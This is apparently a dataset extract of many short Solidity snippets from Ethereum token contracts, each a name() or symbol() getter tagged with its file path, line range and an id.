<source file="systems/source-code/0xa5bf4225edeFe7bdA05825b60D5497e2a5445F1e.sol" startline="51" endline="53" pcid="6031">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xca1d8fef30539ba8f40e11ad60d8b4a863874266.sol" startline="66" endline="68" pcid="7204">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xCe07F8b4f1964E69cc6d52B7A8C4B07496CC4143.sol" startline="68" endline="70" pcid="7326">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x71D87A7100c195679C7731039d37EFBfF1c19e6a.sol" startline="125" endline="127" pcid="4164">
    function symbol() public view  returns (string memory) {
        return _symbol;
    }
</source>
<source file="systems/source-code/0x140682C8B95deC6Bd012303aFc86ca1D55C74E36.sol" startline="57" endline="59" pcid="559">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xaa268b4717907181f8826e1e5bC6ffC4BA3da5A0.sol" startline="63" endline="65" pcid="6184">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x97599936D137EFDD11Eaa2989F58f5a00BCd2803.sol" startline="65" endline="67" pcid="5483">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xcfd07da825fbc71855ce35cc5953336b23e27a82.sol" startline="51" endline="53" pcid="7423">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x7564011A8636815Db93dE33ceD4a65Ea0A8CF337.sol" startline="67" endline="69" pcid="4317">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xe33c37cddb31548856537434d103e57d99242efb.sol" startline="53" endline="55" pcid="8210">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xbb23847f2A80451AFEBB0D0b48Ab6164E3bA2349.sol" startline="66" endline="68" pcid="6748">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xDee33C0f9d5395192ec09e6d4B3753015781C26A.sol" startline="65" endline="67" pcid="7989">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x4701BD9e462012bC2A6D9e6aD71a132d7b64dF7d.sol" startline="67" endline="69" pcid="2673">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x24EdaAAdB4EA4C7aa6CAe4dBB0D0a93C8F5FF180.sol" startline="66" endline="68" pcid="1146">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xc3ba2cb0b121d567cf559855b7543fbd72ca173b.sol" startline="412" endline="414" pcid="7016">
  function symbol() external view returns (string memory) {
    return _symbol;
  }
</source>
<source file="systems/source-code/0x3711A137D43779d8352624aF0852948434B13ad7.sol" startline="54" endline="56" pcid="1842">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x56cf70eb52d13938b15a850ea6400113478c1015.sol" startline="44" endline="46" pcid="3262">
    function name() public pure returns (string memory) {
        return NAME;
    }
</source>
<source file="systems/source-code/0x55C24F7AdB76f73E9d7FEF837FA0538edBd00280.sol" startline="68" endline="70" pcid="3193">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xefF6ee6e86feF5f6b61560a3c99e7DCFf53f7bb6.sol" startline="66" endline="68" pcid="8782">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x033Be8705C262bb2A12da0274297790e9479CCe1.sol" startline="67" endline="69" pcid="140">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xcd8bdb2857ea0948122ccb9b17fc2a6d721b97ae.sol" startline="68" endline="70" pcid="7296">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xf49f16cd3370fB4cCD6C99e1C6F465d53fdec793.sol" startline="54" endline="56" pcid="8907">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x648a2725f5f2Fc16D9c32861cb3045A0D64fF718.sol" startline="49" endline="51" pcid="3785">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xf86c25675cd74be058a798894008ecf6a67dca21.sol" startline="69" endline="71" pcid="9043">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xBeC25691510e9A714648323DC55bEC5199719d52.sol" startline="686" endline="688" pcid="6825">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x41074D4fAe6571188B306Ed26636a00E768E7Bb9.sol" startline="142" endline="144" pcid="2386">
    function name() public view returns (string memory) {
        return _name;
    }
</source>
<source file="systems/source-code/0xc09fB61CD91439C2CB8f8554f701c33cECA47a25.sol" startline="54" endline="56" pcid="6891">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x802684855737ba75aBF906709cD1516817Ef7C74.sol" startline="55" endline="57" pcid="4738">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xe542Cc82fcd14a249D0Bc3835ef4e3730616b190.sol" startline="56" endline="58" pcid="8285">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x98D29fe112bFce3C568b3e7B56CA95F4f684f2E2.sol" startline="54" endline="56" pcid="5541">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x508D2342902B5D12154dCC7485c1a80242D7AEA9.sol" startline="54" endline="56" pcid="2972">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x400ceeaef948d1DfE5fD1F2fa5a431Fb7e11a086.sol" startline="66" endline="68" pcid="2344">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x766d176a78F7cD88Ea86f9b18b72FF093b4e1DC9.sol" startline="54" endline="56" pcid="4413">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xfBB3b5DF228ded41b9450C535Cd115707c6456C1.sol" startline="66" endline="68" pcid="9177">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x3fb9d6a99375a51fd64641bd6e1fd6dd310b74e4.sol" startline="45" endline="47" pcid="2296">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x8d9579e8591826ef37C80f680e33B6C8c38baB47.sol" startline="68" endline="70" pcid="5186">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x1b7B0b213fB6B96fCFB754881175bb4422e39b52.sol" startline="70" endline="72" pcid="874">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x9c03094376D96C2b5ffd1B1C5129b048438700CF.sol" startline="49" endline="51" pcid="5670">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xEb91539BFB1eF16F43Dd4E9c81e4d92f56450Cff.sol" startline="67" endline="69" pcid="8584">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x75774b445262eE2952CF1a26b5d735Fe648FCE28.sol" startline="54" endline="56" pcid="4328">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xdea8f0f40066bbc20c044729f08d3c488e4603d8.sol" startline="52" endline="54" pcid="7955">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xCBf5E1478f1B77672a2684535D9aE9Fe1A7aBe5e.sol" startline="71" endline="73" pcid="7250">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xe57f93Bc66faffdC06eabEf8dB45e1fF28Bf67d3.sol" startline="70" endline="72" pcid="8304">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xe0A9b2Cbd7147f9fb0fE09fAcD2aAB94C0f51444.sol" startline="670" endline="672" pcid="8072">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xa33ced472a9b6dd99abc6bae53d4a905832e02cf.sol" startline="53" endline="55" pcid="5906">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xa7c6613DE0Aab01987058607aB7EC0b2bBeFE54c.sol" startline="66" endline="68" pcid="6135">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x075D3f6AcC15Caf4F8699D72Bc760A09f5842C3f.sol" startline="54" endline="56" pcid="186">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x25CbbcDdc474eD95A5539C382ba6F486b2EB8D84.sol" startline="70" endline="72" pcid="1198">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xe928e115184bad954b11c477df5e1fc94f04e45d.sol" startline="68" endline="70" pcid="8424">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xb07F1e635FbA15234B11A351Ee03Da67D11111B2.sol" startline="71" endline="73" pcid="6501">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xFE485690c31dD2DCbc1919B430d594F3389D6e82.sol" startline="378" endline="380" pcid="9309">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xca1d8fef30539ba8f40e11ad60d8b4a863874266.sol" startline="50" endline="52" pcid="7200">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x569BFe249181f42c823bEBda9799e1E65f4254B6.sol" startline="69" endline="71" pcid="3238">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xCf60d61616a64371DF34580AcE2b13401d29C55c.sol" startline="54" endline="56" pcid="7379">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xecF790443697567D67022c757ABE80ac4648dA0E.sol" startline="54" endline="56" pcid="8667">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x11067Cc96F63B2b375fb740FEee95aA2009A5249.sol" startline="55" endline="57" pcid="444">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xf34839a7431d6c70673f3a3bcfb589c042fd219d.sol" startline="63" endline="65" pcid="8851">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x9f956D811170c17aEeA2382b44132520D7A63701.sol" startline="50" endline="52" pcid="5745">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x441b741A92A2f35EA521918D3732D7449273EBE5.sol" startline="65" endline="67" pcid="2510">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xD1D8c3f9a5609027A1c7cEF070aB9c51b99DCFf7.sol" startline="54" endline="56" pcid="7483">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x346708D8507D3114a1fa26E7f5E11aE1ba50dF2a.sol" startline="70" endline="72" pcid="1641">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xc3269e2917AcF46F7eDF508cf875f8e29313dabF.sol" startline="66" endline="68" pcid="6985">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xf86c25675cd74be058a798894008ecf6a67dca21.sol" startline="53" endline="55" pcid="9039">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x2362dE6A331ca1f0f5243CE99792dbEdab68D184.sol" startline="55" endline="57" pcid="1061">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x6123891860a51956182A48145D34179b97bE0077.sol" startline="52" endline="54" pcid="3708">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x76bD48f622Df028AeD28cB121DdA887F84EA805B.sol" startline="70" endline="72" pcid="4432">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x0555a666a7b5784f5bdbe6f6f64de402df661ee1.sol" startline="44" endline="46" pcid="150">
    function name() public pure returns (string memory) {
        return NAME;
    }
</source>
<source file="systems/source-code/0xc17DC80eF016E918587Ea3ffb55894a8515519C1.sol" startline="67" endline="69" pcid="6940">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xa5bf4225edeFe7bdA05825b60D5497e2a5445F1e.sol" startline="67" endline="69" pcid="6035">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x7E6d55c8dF6E82AfbC76620561cFB99196aC090c.sol" startline="51" endline="53" pcid="4687">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x2bc6B9e1b6AE7EDF9a21298Ba0bfe18a166a41d3.sol" startline="69" endline="71" pcid="1294">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x6301C00FADD94F10409FC62E08215253fB838F46.sol" startline="51" endline="53" pcid="3770">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x5ba66281ec78ee1a83e7a449d1692b0fda7023e2.sol" startline="39" endline="41" pcid="3495">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x53f9c54a9Ec424790E908df9068d746F6A25DE6A.sol" startline="56" endline="58" pcid="3114">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x75d5d49F80871F23bEE1448070790A77C56d3d00.sol" startline="48" endline="50" pcid="4359">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x55C24F7AdB76f73E9d7FEF837FA0538edBd00280.sol" startline="52" endline="54" pcid="3189">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xC2DF29A6Ee0a3C12446E45Ad1340A30fEF33a6A9.sol" startline="54" endline="56" pcid="6966">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x93641b862C7C657138896678Ab745592D7072C15.sol" startline="68" endline="70" pcid="5355">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x441b741A92A2f35EA521918D3732D7449273EBE5.sol" startline="49" endline="51" pcid="2506">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xa0f68ff057c6c5c05d49697adaba44b224b5d284.sol" startline="386" endline="388" pcid="5808">
  function name() external view returns (string memory) {
    return _name;
  }
</source>
<source file="systems/source-code/0xDe77F59a385B50d78aeB7C646d9dF1E4fD76f1a4.sol" startline="55" endline="57" pcid="7940">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x033Be8705C262bb2A12da0274297790e9479CCe1.sol" startline="51" endline="53" pcid="136">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xf34839a7431d6c70673f3a3bcfb589c042fd219d.sol" startline="47" endline="49" pcid="8847">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xD4cab8f7eB7c8b3DE16b4869CF79FD40D87289C7.sol" startline="51" endline="53" pcid="7602">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x9f111397a5A114654A9A6Aa6b3Cd35fbC4500a88.sol" startline="50" endline="52" pcid="5730">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x8f5b2832b8D440cf00B5Ef5a37d12DC9d96F0839.sol" startline="69" endline="71" pcid="5252">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x33F474718b13546c5A717Ff1Fbd2d8BcaB6Fdd45.sol" startline="68" endline="70" pcid="1596">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x8EB829589a20Aa412577544cD6e9732087B691AB.sol" startline="363" endline="365" pcid="5242">
    function name() public view returns (string memory) {
        return _name;
    }
</source>
<source file="systems/source-code/0x42237AC5Aed08d64FEAE4817fa1F0282087447f7.sol" startline="70" endline="72" pcid="2434">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x1b7B0b213fB6B96fCFB754881175bb4422e39b52.sol" startline="54" endline="56" pcid="870">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x3c44f3b816Dac7abDe925fDBB52448b9aB23f623.sol" startline="66" endline="68" pcid="2110">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x1E453405B5B7656ae31B7cCBb783979723244327.sol" startline="69" endline="71" pcid="941">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x887503fb56fDD4b0C97dD5ad5f01EACc4847E682.sol" startline="68" endline="70" pcid="5047">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xd5e370D59C687fcB30943607C3E8f9249ee68619.sol" startline="50" endline="52" pcid="7647">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x2EE5459A05D2DCF76699D0A383EdAcD6e5A8Ee03.sol" startline="52" endline="54" pcid="1411">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x156ba8A652411cd1F4fFbdA89f96172d5C76bD3A.sol" startline="141" endline="143" pcid="614">
    function name() public view returns (string memory) {
        return _name;
    }
</source>
<source file="systems/source-code/0xc0df2A6330877c7632051E2A30e8Eb732fa1aE02.sol" startline="47" endline="49" pcid="6906">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x550f95a80e42c5cfBc786C5C47322862e0332528.sol" startline="53" endline="55" pcid="3174">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x1A2d73a3c991da558bcAeE1f02408fe5a9471afa.sol" startline="67" endline="69" pcid="834">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x5775071e01A9A3FC99484b55dF24541AFccDDe5C.sol" startline="51" endline="53" pcid="3284">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xCf60d61616a64371DF34580AcE2b13401d29C55c.sol" startline="70" endline="72" pcid="7383">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xe10f1b5466b361c9c8c735021A6d00CDea855763.sol" startline="69" endline="71" pcid="8091">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x248B4A2b9897b72994722C0e259BC1Eca38eAbf0.sol" startline="54" endline="56" pcid="1107">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xa42284f1617bc85bd6c0139f9482b0908ee42915.sol" startline="52" endline="54" pcid="5957">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x8EB829589a20Aa412577544cD6e9732087B691AB.sol" startline="370" endline="372" pcid="5243">
    function symbol() public view returns (string memory) {
        return _symbol;
    }
</source>
<source file="systems/source-code/0xD779eC84BC7681f2d2c51799bCF0A362b5130044.sol" startline="51" endline="53" pcid="7694">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xeE35812e1254Da3Bd81eA1ba4275f2001085d671.sol" startline="66" endline="68" pcid="8692">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x3D0ff3246C0C91DDF19688A8CAE0b3F9FfFB5090.sol" startline="56" endline="58" pcid="2195">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x6aEcF2403283336E1644ee3018c01676f149994B.sol" startline="124" endline="126" pcid="3934">
    function symbol() public view  returns (string memory) {
        return _symbol;
    }
</source>
<source file="systems/source-code/0x89C8Eb764Ae4e7EF67f5E84f0eeE404a2Fb02bed.sol" startline="72" endline="74" pcid="5107">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x700ab19C3D9FA23d1A194761eddD9986Aa620293.sol" startline="52" endline="54" pcid="4103">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x888Ab493a44007445eBc70d5537eb29f95A2D3eC.sol" startline="56" endline="58" pcid="5058">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xe75e3c43e328F92a66e787b5e4B81f5A271a78a5.sol" startline="50" endline="52" pcid="8345">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x1684f783064B9F4D6273e9ed11F5D753C193E5E5.sol" startline="70" endline="72" pcid="679">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xa0f68ff057c6c5c05d49697adaba44b224b5d284.sol" startline="379" endline="381" pcid="5807">
  function symbol() external view returns (string memory) {
    return _symbol;
  }
</source>
<source file="systems/source-code/0xE413f21F74faC68bCd2c16626f0FCa30b55692Dd.sol" startline="68" endline="70" pcid="8274">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x248B4A2b9897b72994722C0e259BC1Eca38eAbf0.sol" startline="70" endline="72" pcid="1111">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x4bC87FcdC4D85341976568aD86cb5dE9c038Bd4A.sol" startline="70" endline="72" pcid="2837">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xA55a6E9BFC3Ba7cb2421146B8F111919bCfB0060.sol" startline="50" endline="52" pcid="6016">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x3063792385BB315E7016f3E4eFb0560b567DB022.sol" startline="54" endline="56" pcid="1485">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xe6306Af140F6eefa1d461Ff04a549D51FF4dd16B.sol" startline="66" endline="68" pcid="8319">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xA84aFAFf03113A740F0572E617d5972654F0dA4F.sol" startline="52" endline="54" pcid="6146">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xf9e29e9c25b76744119a8f42478dc0d46e3aebfe.sol" startline="385" endline="387" pcid="9100">
  function name() external view returns (string memory) {
    return _name;
  }
</source>
<source file="systems/source-code/0x4504921b0d800eca1770f89740b7aaa8f3f57fb9.sol" startline="72" endline="74" pcid="2574">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x08CA60267661ce86730fc825Be00385d8635B94B.sol" startline="53" endline="55" pcid="223">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x3f2c722fd5aedb210beaa0f6932f355c1973c94b.sol" startline="69" endline="71" pcid="2267">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x2bc6B9e1b6AE7EDF9a21298Ba0bfe18a166a41d3.sol" startline="53" endline="55" pcid="1290">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xB264455716277D6D1445A4B875efAb6DE8931F4a.sol" startline="66" endline="68" pcid="6538">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xc18250a3Ca19Da5214B0B7A16c788726139d0b00.sol" startline="70" endline="72" pcid="6955">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x3Ad865f49cb532cE565677635F9ED7b3CbF27A5d.sol" startline="477" endline="479" pcid="1992">
    function symbol() public view returns (string memory) {
      return _symbol;
    }
</source>
<source file="systems/source-code/0xAe5A5174359c2c77D60aBCff529308266aa32c5e.sol" startline="69" endline="71" pcid="6319">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x3C44CdD91a695287BAECF13a876B599e30F40Ae8.sol" startline="70" endline="72" pcid="2095">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xaE962d11E0a74cE271f7a111a0C3F538eD3DeDE6.sol" startline="68" endline="70" pcid="6364">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x020b7C91ca0C63477DF2f68ac47A6c41a370CE37.sol" startline="68" endline="70" pcid="66">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x13aa62cE2b990807c069d04A61E8475c45a150E5.sol" startline="68" endline="70" pcid="518">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xa71Cbe77C505140Cd10070401b82580E0Fe94a1B.sol" startline="73" endline="75" pcid="6104">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xc9e2d2a161445b4602d1908dae1a4ad90e3f1b49.sol" startline="69" endline="71" pcid="7189">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x99E6b2939603Ac9F9daF3f441f1A1A05b6d54c1f.sol" startline="68" endline="70" pcid="5609">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xb7844372AB08A7EBA9D3cA79ccDe3F22C990b1E5.sol" startline="54" endline="56" pcid="6666">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xaa268b4717907181f8826e1e5bC6ffC4BA3da5A0.sol" startline="47" endline="49" pcid="6180">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x82f8c11f816693442b3a7d38cfba92abc7f356b0.sol" startline="53" endline="55" pcid="4914">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x3a862ec30f2b3Ce5419177221E9E1B151AcC0016.sol" startline="69" endline="71" pcid="1949">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x5775071e01A9A3FC99484b55dF24541AFccDDe5C.sol" startline="67" endline="69" pcid="3288">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x94B74A3646f87FADa5EAD91F0af0709fD7c5fe1f.sol" startline="66" endline="68" pcid="5388">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x21bcc45a9a9cb57084b6d6409d8fb0717bffeb91.sol" startline="50" endline="52" pcid="1016">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xafC5AE8b1149E8b488Ef254c4Ee4FcfA4c3eE124.sol" startline="52" endline="54" pcid="6422">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x0617c6f1b099dff080a44451a3882b42bfa75188.sol" startline="52" endline="54" pcid="171">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x39Fd4791fC181B9889397101E644460705aA11d0.sol" startline="31" endline="33" pcid="1938">
    function name() public pure returns (string memory) {
        return NAME;
    }
</source>
<source file="systems/source-code/0xCe07F8b4f1964E69cc6d52B7A8C4B07496CC4143.sol" startline="52" endline="54" pcid="7322">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x66bc620635dd4e5bebdc135489e7cb6f660b2064.sol" startline="47" endline="49" pcid="3835">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x98B84E0f85ECA20c129095886bC9330Cbe32c605.sol" startline="53" endline="55" pcid="5511">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x4115454c188acFB9Cb67c6d795214055381b53B5.sol" startline="55" endline="57" pcid="2400">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x033B28BE598a95363830624C0601E58AB03e9922.sol" startline="69" endline="71" pcid="125">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x23ffd2f59ec758388282634cda63d6dc1e3120f2.sol" startline="126" endline="128" pcid="1089">
    function symbol() public view  returns (string memory) {
        return _symbol;
    }
</source>
<source file="systems/source-code/0x9adA335674982c21785141cb8bD6B1e0f9ac1FC4.sol" startline="69" endline="71" pcid="5644">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x5D72b13F2b049d108CBc50b038dcC10904653d35.sol" startline="52" endline="54" pcid="3545">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xE8EE7f2c7e487F6Cf4424FE4589a37883986c402.sol" startline="55" endline="57" pcid="8405">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x24982c94a024e5fb32eba94eda02404a89dadaef.sol" startline="48" endline="50" pcid="1121">
    function symbol() public pure returns (string memory) {
        return SYMBOL;
    }
